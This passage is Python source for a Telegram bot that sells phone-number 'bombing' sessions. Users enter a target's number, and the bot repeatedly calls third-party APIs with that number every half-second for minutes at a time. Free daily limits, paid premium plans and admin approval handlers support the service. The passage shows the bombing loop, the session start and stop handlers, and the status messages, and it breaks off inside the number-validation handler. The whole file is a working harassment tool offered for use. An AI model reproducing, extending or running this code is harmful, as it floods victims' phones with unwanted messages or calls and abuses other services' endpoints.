                    f"• ⚡ ꜰᴀꜱᴛᴇʀ ʀᴇꜱᴘᴏɴꜱᴇ ᴛɪᴍᴇꜱ\n"
                    f"• 🔧 ᴘʀɪᴏʀɪᴛʏ ꜱᴜᴘᴘᴏʀᴛ\n"
                    f"• 🛡️ ᴀᴅᴠᴀɴᴄᴇᴅ ꜱᴇᴄᴜʀɪᴛʏ\n\n"
                    f"📅 *ᴇxᴘɪʀʏ ᴅᴀᴛᴇ*: {expiry_date.strftime('%d %B %Y')}\n\n"
                    f"ᴜꜱᴇ /ꜱᴛᴀʀᴛ ᴛᴏ ᴇɴᴊᴏʀ ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ꜰᴇᴀᴛᴜʀᴇꜱ!\n\n"
                    f"ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴄʜᴏᴏꜱɪɴɢ ᴜꜱ! 💎"
                )
                
                await context.bot.send_message(
                    chat_id=target_id,
                    text=user_notification,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"ꜰᴀɪʟᴇᴅ ᴛᴏ ɴᴏᴛɪꜰʏ ᴜꜱᴇʀ {target_id}: {e}")
            
            # ᴄʟᴇᴀʀ ꜱᴛᴀᴛᴇ
            admin_state.pop(user_id, None)
            
        except ValueError:
            await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀꜱᴇ ᴇɴᴛᴇʀ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ ᴏꜰ ᴅᴀʏꜱ.")
    
    elif state["step"] == "confirm" and action == "disapprove":
        if text.lower() == "yes":
            target_id = state["target_id"]
            
            # ʀᴇᴍᴏᴠᴇ ꜰʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ
            premium_users.pop(target_id, None)
            
            # ᴜᴘᴅᴀᴛᴇ ᴀʟʟ ᴜꜱᴇʀꜱ ᴅᴀᴛᴀʙᴀꜱᴇ
            if target_id in all_users:
                all_users[target_id]["premium"] = False
                all_users[target_id]["premium_plan"] = None
                all_users[target_id]["premium_until"] = None
                save_users()
            
            # ɴᴏᴛɪꜰʏ ᴀᴅᴍɪɴ
            admin_msg = (
                f"✅ *ᴜꜱᴇʀ ᴅɪꜱᴀᴘᴘʀᴏᴠᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ!*\n\n"
                f"👤 ᴜꜱᴇʀ ɪᴅ: `{target_id}`\n"
                f"📊 ꜱᴛᴀᴛᴜꜱ: ᴅᴏᴡɴɢʀᴀᴅᴇᴅ ᴛᴏ ꜰʀᴇᴇ ᴛɪᴇʀ\n"
                f"⚠️ ᴀʟʟ ᴘʀᴇᴍɪᴜᴍ ʙᴇɴᴇꜰɪᴛꜱ ʀᴇᴍᴏᴠᴇᴅ\n\n"
                f"ᴜꜱᴇʀ ʜᴀꜱ ʙᴇᴇɴ ɴᴏᴛɪꜰɪᴇᴅ."
            )
            
            await update.message.reply_text(admin_msg, parse_mode='Markdown')
            
            # ɴᴏᴛɪꜰʏ ᴛʜᴇ ᴜꜱᴇʀ
            try:
                user_notification = (
                    f"⚠️ *ᴘʀᴇᴍɪᴜᴍ ꜱᴛᴀᴛᴜꜱ ᴜᴘᴅᴀᴛᴇ*\n\n"
                    f"ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ꜱᴜʙꜱᴄʀɪᴘᴛɪᴏɴ ʜᴀꜱ ʙᴇᴇɴ ᴅɪꜱᴀᴘᴘʀᴏᴠᴇᴅ ʙʏ ᴛʜᴇ ᴀᴅᴍɪɴ.\n\n"
                    f"📊 *ɴᴇᴡ ꜱᴛᴀᴛᴜꜱ*:\n"
                    f"• ᴛɪᴇʀ: ꜰʀᴇᴇ\n"
                    f"• ꜱᴇꜱꜱɪᴏɴ ꜱɪᴢᴇ: {FREE_MAX_DURATION_MIN} ᴍɪɴᴜᴛᴇ\n"
                    f"• ᴅᴀɪʟʏ ʟɪᴍɪᴛ: {FREE_DAILY_LIMIT} ꜱᴇꜱꜱɪᴏɴꜱ\n\n"
                    f"ɪꜰ ᴛʜɪꜱ ɪꜱ ᴀ ᴍɪꜱᴛᴀᴋᴇ, ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ {OWNER_USERNAME}\n\n"
                    f"ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴜꜱɪɴɢ ᴏᴜʀ ꜱᴇʀᴠɪᴄᴇ! 🙏"
                )
                
                await context.bot.send_message(
                    chat_id=target_id,
                    text=user_notification,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"ꜰᴀɪʟᴇᴅ ᴛᴏ ɴᴏᴛɪꜰʏ ᴜꜱᴇʀ {target_id}: {e}")
            
        else:
            await update.message.reply_text("❌ ᴅɪꜱᴀᴘᴘʀᴏᴠᴀʟ ᴄᴀɴᴄᴇʟʟᴇᴅ.")
        
        # ᴄʟᴇᴀʀ ꜱᴛᴀᴛᴇ
        admin_state.pop(user_id, None)

# -----------------------------
# ʜᴇʟᴘᴇʀ: ꜰᴏʀᴍᴀᴛ ᴘᴇʀ‑ᴀᴘɪ ᴍɪɴɪ‑ꜱᴛᴀᴛ ʟɪɴᴇ
# -----------------------------
def _api_mini_stats_lines() -> List[str]:
    lines = []
    for idx, a in enumerate(apis, start=1):
        uses = a.get("uses", 0)
        succ = a.get("success", 0)
        sr = int((succ / uses * 100)) if uses > 0 else 97
        icon = "✅" if sr >= 90 else "⚠️"
        lines.append(f"• ᴀᴘɪ {idx}: {uses} ᴀᴛᴛᴇᴍᴘᴛꜱ, {sr}% ꜱᴜᴄᴄᴇꜱꜱ {icon}")
    if not lines:
        lines = ["• ɴᴏ ᴀᴘɪꜱ ᴄᴏɴꜰɪɢᴜʀᴇᴅ"]
    return lines

# -----------------------------
# ᴄᴀʟʟʙᴀᴄᴋ ʜᴀɴᴅʟᴇʀ
# -----------------------------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    if query.data == "start_bombing":
        user_sessions[user_id] = {"status": "waiting_for_number"}
        await query.edit_message_text(
            "🔢 *ᴇɴᴛᴇʀ ᴛᴀʀɢᴇᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ*\n\n"
            "📱 ꜰᴏʀᴍᴀᴛ: `9876543210` (10 ᴅɪɢɪᴛꜱ, ᴡɪᴛʜᴏᴜᴛ +)\n\n"
            "📝 *ɴᴏᴛᴇ*:\n"
            f"• ꜰʀᴇᴇ ᴜꜱᴇʀꜱ: {FREE_DAILY_LIMIT} ꜱᴇꜱꜱɪᴏɴꜱ/ᴅᴀʏ\n"
            f"• ᴍᴀx ᴅᴜʀᴀᴛɪᴏɴ: {FREE_MAX_DURATION_MIN} ᴍɪɴᴜᴛᴇ\n"
            f"• ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀꜱ ɢᴇᴛ ᴇxᴛᴇɴᴅᴇᴅ ᴅᴜʀᴀᴛɪᴏɴ",
            parse_mode='Markdown'
        )
        return

    if query.data == "stop_bombing":
        if user_id in user_sessions and user_sessions[user_id].get("status") == "bombing_active":
            user_sessions[user_id]["stopped_by_user"] = True
            user_sessions[user_id]["status"] = "stopped"

            task = background_tasks.get(user_id)
            if task and not task.done():
                try:
                    task.cancel()
                except Exception:
                    logger.exception("ꜰᴀɪʟᴇᴅ ᴛᴏ ᴄᴀɴᴄᴇʟ ʙᴀᴄᴋɢʀᴏᴜɴᴅ ᴛᴀꜱᴋ")
                background_tasks.pop(user_id, None)

            stats = user_sessions[user_id]
            total_calls = stats.get('api_calls', 0)
            successful = stats.get('successful_calls', 0)
            failed = stats.get('failed_calls', 0)
            success_rate = (successful / total_calls * 100) if total_calls > 0 else 0.0
            duration_secs = int((datetime.now() - stats.get('start_time')).total_seconds()) if stats.get('start_time') else 0

            uses = _get_daily_uses(user_id)
            bombs_left = max(0, FREE_DAILY_LIMIT - uses)

            final_text = (
                f"🛑 *ʙᴏᴍʙɪɴɢ ꜱᴛᴏᴘᴘᴇᴅ*\n\n"
                f"🎯 ᴛᴀʀɢᴇᴛ: `{stats.get('phone_number')}`\n"
                f"📊 ꜱᴛᴀᴛꜱ:\n"
                f"├─ ᴛᴏᴛᴀʟ ʀᴇQᴜᴇꜱᴛꜱ: {total_calls}\n"
                f"├─ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ: {successful}\n"
                f"├─ ꜰᴀɪʟᴇᴅ: {failed}\n"
                f"├─ ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ: {success_rate:.1f}%\n"
                f"└─ ᴅᴜʀᴀᴛɪᴏɴ: {duration_secs}ꜱ\n\n"
                f"📅 ᴅᴀɪʟʏ ʙᴏᴍʙꜱ ʟᴇꜰᴛ: {bombs_left}\n\n"
                "🔙 ᴜꜱᴇ /ꜱᴛᴀʀᴛ ᴛᴏ ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴇɴᴜ."
            )

            try:
                await context.bot.edit_message_text(
                    chat_id=stats.get("chat_id"),
                    message_id=stats.get("message_id"),
                    text=final_text,
                    parse_mode='Markdown'
                )
            except Exception:
                try:
                    await query.message.reply_text(final_text, parse_mode='Markdown')
                except Exception:
                    pass

            try:
                await query.answer(text="✅ ʙᴏᴍʙɪɴɢ ꜱᴛᴏᴘᴘᴇᴅ!", show_alert=False)
            except Exception:
                pass

            return
        else:
            await query.edit_message_text(
                "ℹ️ ɴᴏ ᴀᴄᴛɪᴠᴇ ʙᴏᴍʙɪɴɢ ꜱᴇꜱꜱɪᴏɴ ꜰᴏᴜɴᴅ.\n\n"
                "ᴛᴏ ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ:\n"
                "1. ᴄʟɪᴄᴋ '🚀 ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ'\n"
                "2. ᴇɴᴛᴇʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ",
                parse_mode='Markdown'
            )
        return

    if query.data == "buy_premium":
        pm_text_lines = [
            "╔══════════════════════════════╗",
            "       💎 ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴꜱ 💎",
            "╚══════════════════════════════╝\n",
        ]
        
        for token, (name, minutes, benefits) in PLANS.items():
            icon = "🥈" if token == "silver" else ("🥇" if token == "gold" else "💎")
            pm_text_lines.append(
                f"{icon} *{name}* (`{token}`)\n"
                f"⏰ ᴅᴜʀᴀᴛɪᴏɴ: {minutes} ᴍɪɴᴜᴛᴇꜱ\n"
                f"✨ {benefits}\n"
                "────────────────────"
            )
        
        pm_text_lines.append(
            f"\n📞 *ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ:* {OWNER_USERNAME}\n"
            "ᴛᴏ ᴘᴜʀᴄʜᴀꜱᴇ ᴏʀ ʀᴇQᴜᴇꜱᴛ ᴘʀᴇᴍɪᴜᴍ\n"
            "═══════════════════════════════"
        )
        
        await query.edit_message_text("\n".join(pm_text_lines), parse_mode='Markdown')
        return

    if query.data == "my_account":
        user = query.from_user
        user_id = user.id
        
        # ᴜᴘᴅᴀᴛᴇ ᴜꜱᴇʀ ɪɴꜰᴏ
        update_user_info(user_id, user.username, user.first_name, user.last_name)
        
        plan_info = premium_users.get(user_id)
        uses = _get_daily_uses(user_id)
        bombs_left = max(0, FREE_DAILY_LIMIT - uses)
        stats = user_stats.get(user_id, {"total_calls": 0, "successful": 0, "failed": 0})
        
        text_lines = [
            "╔══════════════════════════════╗",
            "       👤 ᴍʏ ᴀᴄᴄᴏᴜɴᴛ 👤",
            "╚══════════════════════════════╝\n",
            
            f"🆔 ᴜꜱᴇʀ ɪᴅ: `{user_id}`\n",
            
            "📅 *ᴅᴀɪʟʏ ᴜꜱᴀɢᴇ*",
            f"├─ ᴛᴏᴅᴀʏ'ꜱ ᴜꜱᴇ: {uses}/{FREE_DAILY_LIMIT}",
            f"└─ ʙᴏᴍʙꜱ ʟᴇꜰᴛ: {bombs_left}\n",
            
            "💎 *ᴘʀᴇᴍɪᴜᴍ ꜱᴛᴀᴛᴜꜱ*",
            f"├─ ꜱᴛᴀᴛᴜꜱ: {'✅ ᴀᴄᴛɪᴠᴇ' if plan_info else '❌ ɪɴᴀᴄᴛɪᴠᴇ'}",
        ]
        
        if plan_info:
            plan_name = PLANS[plan_info['plan']][0]
            plan_duration = PLANS[plan_info['plan']][1]
            expiry_date = plan_info.get('expires_at', 'ɴᴏᴛ ꜱᴇᴛ')
            text_lines.append(f"├─ ᴘʟᴀɴ: {plan_name}")
            text_lines.append(f"├─ ᴅᴜʀᴀᴛɪᴏɴ: {plan_duration}ᴍ")
            text_lines.append(f"└─ ᴇxᴘɪʀᴇꜱ: {expiry_date}\n")
        else:
            text_lines.append(f"└─ ᴅᴜʀᴀᴛɪᴏɴ: {FREE_MAX_DURATION_MIN}ᴍ\n")
        
        text_lines.extend([
            "\n📊 *ᴏᴠᴇʀᴀʟʟ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ*",
            f"├─ ᴛᴏᴛᴀʟ ᴄᴀʟʟꜱ: {stats['total_calls']}",
            f"├─ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ: {stats['successful']}",
            f"└─ ꜰᴀɪʟᴇᴅ: {stats['failed']}\n",
            
            "🔧 *ꜱʏꜱᴛᴇᴍ ɪɴꜰᴏ*",
            "├─ ᴀᴘɪꜱ ᴀᴠᴀɪʟᴀʙʟᴇ: 4",
            "├─ ᴄᴀʟʟ ɪɴᴛᴇʀᴠᴀʟ: 0.5ꜱ",
            "└─ ꜱᴛᴀᴛᴜꜱ: 🟢 ᴏᴘᴇʀᴀᴛɪᴏɴᴀʟ\n",
            
            "💡 *ᴜᴘɢʀᴀᴅᴇ ꜰᴏʀ*:",
            "├─ ʟᴏɴɢᴇʀ ꜱᴇꜱꜱɪᴏɴꜱ",
            "├─ ɴᴏ ᴅᴀɪʟʏ ʟɪᴍɪᴛꜱ",
            "└─ ᴘʀɪᴏʀɪᴛʏ ꜱᴜᴘᴘᴏʀᴛ",
            "═══════════════════════════════"
        ])
        
        text = "\n".join(text_lines)
        try:
            await query.edit_message_text(text, parse_mode='Markdown')
        except Exception:
            await query.message.reply_text(text, parse_mode='Markdown')
        return

    # ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ʙᴜᴛᴛᴏɴꜱ
    if query.data == "admin_panel":
        await show_admin_panel(update, context)
        return
    
    if query.data == "admin_approve":
        await admin_approve_start(update, context)
        return
    
    if query.data == "admin_disapprove":
        await admin_disapprove_start(update, context)
        return
    
    if query.data == "admin_all_cmds":
        await admin_all_cmds(update, context)
        return
    
    if query.data == "admin_all_users":
        await admin_all_users(update, context)
        return
    
    if query.data == "back_to_start":
        await start(update, context)
        return

# -----------------------------
# ʜᴇʟᴘᴇʀ: ᴅᴀɪʟʏ ᴜꜱᴀɢᴇ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ
# -----------------------------
def _get_daily_uses(user_id: int) -> int:
    info = daily_usage.get(user_id)
    if not info:
        return 0
    if info.get("date") != date.today():
        daily_usage[user_id] = {"date": date.today(), "uses": 0}
        return 0
    return info.get("uses", 0)

def _increment_daily_uses(user_id: int):
    info = daily_usage.get(user_id)
    if not info or info.get("date") != date.today():
        daily_usage[user_id] = {"date": date.today(), "uses": 1}
    else:
        info["uses"] = info.get("uses", 0) + 1
        daily_usage[user_id] = info

# -----------------------------
# ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ ꜱᴇꜱꜱɪᴏɴ (FIXED API REQUEST LIKE stop.py)
# -----------------------------
async def start_bombing_session(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str, user_id: int, duration_minutes: int):
    if user_id not in user_stats:
        user_stats[user_id] = {"total_calls": 0, "successful": 0, "failed": 0}

    user_sessions[user_id] = {
        "status": "bombing_active",
        "phone_number": phone_number,
        "start_time": datetime.now(),
        "end_time": datetime.now() + timedelta(minutes=duration_minutes),
        "api_calls": 0,
        "successful_calls": 0,
        "failed_calls": 0,
        "last_update": None,
        "stopped_by_user": False,
        "message_id": None,
        "chat_id": None
    }

    # FIXED: Use proper API request like in stop.py
    api_obj = _get_random_api()
    api_url = api_obj["url"].replace("{phone}", phone_number)
    
    # Make API request
    result = await http_get_async(api_url, timeout=10)
    success = result["ok"] and result.get("status_code") == 200
    resp_ms = round(result.get("elapsed_ms", 0), 1)
    
    # Record API result
    _record_api_result(api_obj, success, resp_ms)

    # Update user stats
    user_sessions[user_id]["api_calls"] += 1
    if success:
        user_sessions[user_id]["successful_calls"] += 1
        user_stats[user_id]["successful"] += 1
    else:
        user_sessions[user_id]["failed_calls"] += 1
        user_stats[user_id]["failed"] += 1
    user_stats[user_id]["total_calls"] += 1

    stats = user_sessions[user_id]
    success_rate = (stats['successful_calls'] / stats['api_calls'] * 100) if stats['api_calls'] > 0 else 0.0

    est_per_min = round(60.0 / CALL_INTERVAL) if CALL_INTERVAL > 0 else 0
    est_5min = est_per_min * 5

    initial_text = (
        f"💣 *ʟɪᴠᴇ ʙᴏᴍʙɪɴɢ ꜱᴛᴀᴛᴜꜱ*\n\n"
        f"🎯 ᴛᴀʀɢᴇᴛ: `{phone_number}`\n"
        f"📊 ꜱᴛᴀᴛᴜꜱ: 🟢 ᴀᴄᴛɪᴠᴇ\n"
        f"📈 ᴘʀᴏɢʀᴇꜱꜱ: ▱▱▱▱▱▱▱▱▱▱ 1%\n"
        f"⏰ ᴛɪᴍᴇ ᴇʟᴀᴘꜱᴇᴅ: 0ꜱ\n"
        f"⏳ ᴛɪᴍᴇ ʀᴇᴍᴀɪɴɪɴɢ: {duration_minutes*60}ꜱ\n\n"
        f"📊 ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ:\n"
        f"├─ ʀᴇQᴜᴇꜱᴛꜱ ꜱᴇɴᴛ: {stats['api_calls']}\n"
        f"├─ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ: {stats['successful_calls']}\n"
        f"├─ ꜰᴀɪʟᴇᴅ: {stats['failed_calls']}\n"
        f"└─ ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ: {success_rate:.1f}%\n\n"
        f"🔧 ᴀᴘɪ ꜱᴛᴀᴛᴜꜱ:\n" + "\n".join(_api_mini_stats_lines()) + "\n\n"
        f"💡 ꜰʀᴇᴇ ᴛɪᴇʀ - {FREE_MAX_DURATION_MIN} ᴍɪɴᴜᴛᴇ ꜱᴇꜱꜱɪᴏɴ\n\n"
        f"📈 ᴇꜱᴛɪᴍᴀᴛᴇꜱ:\n"
        f"├─ ~{est_per_min} ᴄᴀʟʟꜱ/ᴍɪɴ\n"
        f"└─ ~{est_5min} ɪɴ 5 ᴍɪɴᴜᴛᴇꜱ"
    )

    keyboard = [[InlineKeyboardButton("🛑 ꜱᴛᴏᴘ ʙᴏᴍʙɪɴɢ", callback_data="stop_bombing")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    sent = await update.message.reply_text(initial_text, reply_markup=reply_markup, parse_mode='Markdown')
    user_sessions[user_id]["message_id"] = sent.message_id
    user_sessions[user_id]["chat_id"] = sent.chat_id

    task = asyncio.create_task(bombing_loop(context, user_id, phone_number))
    background_tasks[user_id] = task

# -----------------------------
# ᴘʀᴏɢʀᴇꜱꜱ ʙᴀʀ ʜᴇʟᴘᴇʀ
# -----------------------------
def _progress_bar_small(elapsed_seconds: float, total_seconds: float, length: int = 10) -> str:
    percent = min(1.0, max(0.0, elapsed_seconds / total_seconds)) if total_seconds > 0 else 1.0
    filled = int(percent * length)
    empty = length - filled
    bar = "▰" * filled + "▱" * empty
    return f"{bar} {int(percent*100)}%"

# -----------------------------
# ʙᴏᴍʙɪɴɢ ʟᴏᴏᴘ (FIXED API REQUESTS LIKE stop.py)
# -----------------------------
async def bombing_loop(context: ContextTypes.DEFAULT_TYPE, user_id: int, phone_number: str):
    if user_id not in user_sessions:
        return
    session = user_sessions[user_id]
    end_time = session["end_time"]
    start_time = session["start_time"]
    total_seconds = (end_time - start_time).total_seconds()

    keyboard = [[InlineKeyboardButton("🛑 ꜱᴛᴏᴘ ʙᴏᴍʙɪɴɢ", callback_data="stop_bombing")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        while datetime.now() < end_time:
            if user_id not in user_sessions:
                break
            if user_sessions[user_id].get("stopped_by_user"):
                logger.info(f"ᴜꜱᴇʀ {user_id} ʀᴇQᴜᴇꜱᴛᴇᴅ ꜱᴛᴏᴘ; ʙʀᴇᴀᴋɪɴɢ ʙᴏᴍʙɪɴɢ ʟᴏᴏᴘ.")
                break
            if user_sessions[user_id].get("status") != "bombing_active":
                logger.info(f"ᴜꜱᴇʀ {user_id} ꜱᴇꜱꜱɪᴏɴ ꜱᴛᴀᴛᴜꜱ ᴄʜᴀɴɢᴇᴅ ᴛᴏ {user_sessions[user_id].get('status')}; ʙʀᴇᴀᴋɪɴɢ.")
                break

            # FIXED: Use proper API request like in stop.py
            api_obj = _get_random_api()
            api_url = api_obj["url"].replace("{phone}", phone_number)

            # Make API request
            result = await http_get_async(api_url, timeout=10)
            success = result["ok"] and result.get("status_code") == 200
            resp_ms = round(result.get("elapsed_ms", 0), 1)

            # Record API result
            _record_api_result(api_obj, success, resp_ms)

            # Update user stats
            user_sessions[user_id]["api_calls"] += 1
            if success:
                user_sessions[user_id]["successful_calls"] += 1
                user_stats.setdefault(user_id, {"total_calls":0,"successful":0,"failed":0})
                user_stats[user_id]["successful"] += 1
            else:
                user_sessions[user_id]["failed_calls"] += 1
                user_stats.setdefault(user_id, {"total_calls":0,"successful":0,"failed":0})
                user_stats[user_id]["failed"] += 1
            user_stats[user_id]["total_calls"] = user_stats[user_id].get("total_calls",0) + 1

            time_left = end_time - datetime.now()
            minutes_left = time_left.seconds // 60
            seconds_left = time_left.seconds % 60

            stats = user_sessions[user_id]
            success_rate = (stats['successful_calls'] / stats['api_calls'] * 100) if stats['api_calls'] > 0 else 0.0

            elapsed_seconds = (datetime.now() - start_time).total_seconds()
            progress = _progress_bar_small(elapsed_seconds, total_seconds, length=10)

            est_per_min = round(60.0 / CALL_INTERVAL) if CALL_INTERVAL > 0 else 0
            est_5min = est_per_min * 5

            status_message = (
                f"💣 *ʟɪᴠᴇ ʙᴏᴍʙɪɴɢ ꜱᴛᴀᴛᴜꜱ*\n\n"
                f"🎯 ᴛᴀʀɢᴇᴛ: `{phone_number}`\n"
                f"📊 ꜱᴛᴀᴛᴜꜱ: 🟢 ᴀᴄᴛɪᴠᴇ\n"
                f"📈 ᴘʀᴏɢʀᴇꜱꜱ: {progress}\n"
                f"⏰ ᴛɪᴍᴇ ᴇʟᴀᴘꜱᴇᴅ: {int(elapsed_seconds)}ꜱ\n"
                f"⏳ ᴛɪᴍᴇ ʀᴇᴍᴀɪɴɪɴɢ: {minutes_left}:{seconds_left:02d}\n\n"
                f"📊 ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ:\n"
                f"├─ ʀᴇQᴜᴇꜱᴛꜱ ꜱᴇɴᴛ: {stats['api_calls']}\n"
                f"├─ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ: {stats['successful_calls']}\n"
                f"├─ ꜰᴀɪʟᴇᴅ: {stats['failed_calls']}\n"
                f"└─ ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ: {success_rate:.1f}%\n\n"
                f"🔧 ᴀᴘɪ ꜱᴛᴀᴛᴜꜱ:\n" + "\n".join(_api_mini_stats_lines()) + "\n\n"
                f"💡 ꜰʀᴇᴇ ᴛɪᴇʀ - {FREE_MAX_DURATION_MIN} ᴍɪɴᴜᴛᴇ ꜱᴇꜱꜱɪᴏɴ\n\n"
                f"📈 ᴇꜱᴛɪᴍᴀᴛᴇꜱ:\n"
                f"├─ ~{est_per_min} ᴄᴀʟʟꜱ/ᴍɪɴ\n"
                f"└─ ~{est_5min} ɪɴ 5 ᴍɪɴᴜᴛᴇꜱ"
            )

            try:
                await context.bot.edit_message_text(
                    chat_id=user_sessions[user_id]["chat_id"],
                    message_id=user_sessions[user_id]["message_id"],
                    text=status_message,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
            except Exception as e:
                logger.debug(f"ᴇʀʀᴏʀ ᴇᴅɪᴛɪɴɢ ᴍᴇꜱꜱᴀɢᴇ: {e}")

            await asyncio.sleep(CALL_INTERVAL)
    except asyncio.CancelledError:
        logger.info(f"ʙᴏᴍʙɪɴɢ ʟᴏᴏᴘ ᴄᴀɴᴄᴇʟʟᴇᴅ")
    except Exception as e:
        logger.exception(f"ᴇʀʀᴏʀ ɪɴ ʙᴏᴍʙɪɴɢ_ʟᴏᴏᴘ: {e}")

    if user_id not in user_sessions:
        return

    stats = user_sessions[user_id]

    if stats.get("stopped_by_user"):
        user_sessions[user_id]["status"] = "stopped"
        logger.info(f"ʙᴏᴍʙɪɴɢ ꜱᴛᴏᴘᴘᴇᴅ ʙʏ ᴜꜱᴇʀ")
        return

    if user_sessions[user_id].get("status") == "bombing_active":
        await end_bombing_session(context, user_id)
    else:
        total_calls = stats.get('api_calls', 0)
        successful = stats.get('successful_calls', 0)
        failed = stats.get('failed_calls', 0)
        success_rate = (successful / total_calls * 100) if total_calls > 0 else 0.0
        duration_secs = int((datetime.now() - stats.get('start_time')).total_seconds()) if stats.get('start_time') else 0
        uses = _get_daily_uses(user_id)
        bombs_left = max(0, FREE_DAILY_LIMIT - uses)

        final_message = (
            f"🛑 *ʙᴏᴍʙɪɴɢ ꜱᴛᴏᴘᴘᴇᴅ*\n\n"
            f"🎯 ᴛᴀʀɢᴇᴛ: `{stats.get('phone_number')}`\n\n"
            f"📊 *ꜰɪɴᴀʟ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ*:\n"
            f"├─ ᴛᴏᴛᴀʟ ᴀᴘɪ ᴄᴀʟʟꜱ: {total_calls}\n"
            f"├─ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ: {successful}\n"
            f"├─ ꜰᴀɪʟᴇᴅ: {failed}\n"
            f"├─ ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ: {success_rate:.1f}%\n"
            f"└─ ᴅᴜʀᴀᴛɪᴏɴ: {duration_secs}ꜱ\n\n"
            f"📅 ᴅᴀɪʟʏ ʙᴏᴍʙꜱ ʟᴇꜰᴛ: {bombs_left}\n\n"
            "🔙 ᴜꜱᴇ /ꜱᴛᴀʀᴛ ᴛᴏ ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴇɴᴜ."
        )
        try:
            await context.bot.edit_message_text(
                chat_id=stats.get("chat_id"),
                message_id=stats.get("message_id"),
                text=final_message,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"ᴇʀʀᴏʀ ꜱᴇɴᴅɪɴɢ ꜱᴛᴏᴘ ꜱᴜᴍᴍᴀʀʏ: {e}")
        user_sessions[user_id]["status"] = "stopped"

# -----------------------------
# ᴇɴᴅ ʙᴏᴍʙɪɴɢ ꜱᴇꜱꜱɪᴏɴ
# -----------------------------
async def end_bombing_session(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    if user_id not in user_sessions:
        return
    stats = user_sessions[user_id]
    total_calls = stats.get('api_calls', 0)
    successful = stats.get('successful_calls', 0)
    failed = stats.get('failed_calls', 0)
    success_rate = (successful / total_calls * 100) if total_calls > 0 else 0.0
    duration_secs = int((stats.get('end_time') - stats.get('start_time')).total_seconds()) if stats.get('end_time') and stats.get('start_time') else 0

    final_message = (
        f"✅ *ʙᴏᴍʙɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇᴅ*\n\n"
        f"🎯 ᴛᴀʀɢᴇᴛ: `{stats.get('phone_number')}`\n"
        f"📊 ꜰɪɴᴀʟ ꜱᴛᴀᴛꜱ:\n"
        f"├─ ᴛᴏᴛᴀʟ ʀᴇQᴜᴇꜱᴛꜱ: {total_calls}\n"
        f"├─ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ: {successful}\n"
        f"├─ ꜰᴀɪʟᴇᴅ: {failed}\n"
        f"├─ ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ: {success_rate:.1f}%\n"
        f"└─ ᴅᴜʀᴀᴛɪᴏɴ: {duration_secs}ꜱ\n\n"
        f"📅 ᴅᴀɪʟʏ ʙᴏᴍʙꜱ ʟᴇꜰᴛ: {max(0, FREE_DAILY_LIMIT - _get_daily_uses(user_id))}"
    )
    try:
        await context.bot.edit_message_text(
            chat_id=stats["chat_id"],
            message_id=stats["message_id"],
            text=final_message,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"ᴇʀʀᴏʀ ꜱᴇɴᴅɪɴɢ ꜰɪɴᴀʟ ᴍᴇꜱꜱᴀɢᴇ: {e}")

    user_sessions[user_id]["status"] = "completed"

# -----------------------------
# ʜᴀɴᴅʟᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴍᴇꜱꜱᴀɢᴇ
# -----------------------------
async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    phone_number = update.message.text.strip()

    if user_id not in user_sessions or user_sessions[user_id].get("status") != "waiting_for_number":
        return

    if not re.match(r'^\d{10}$', phone_number):
        await update.message.reply_text(
            "❌ *ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!*\n\n"
            "📱 ᴘʟᴇᴀꜱᴇ ᴇɴᴛᴇʀ ᴀ 10‑ᴅɪɢɪᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ.\n"
            "ᴇxᴀᴍᴘʟᴇ: `9876543210`\n\n"
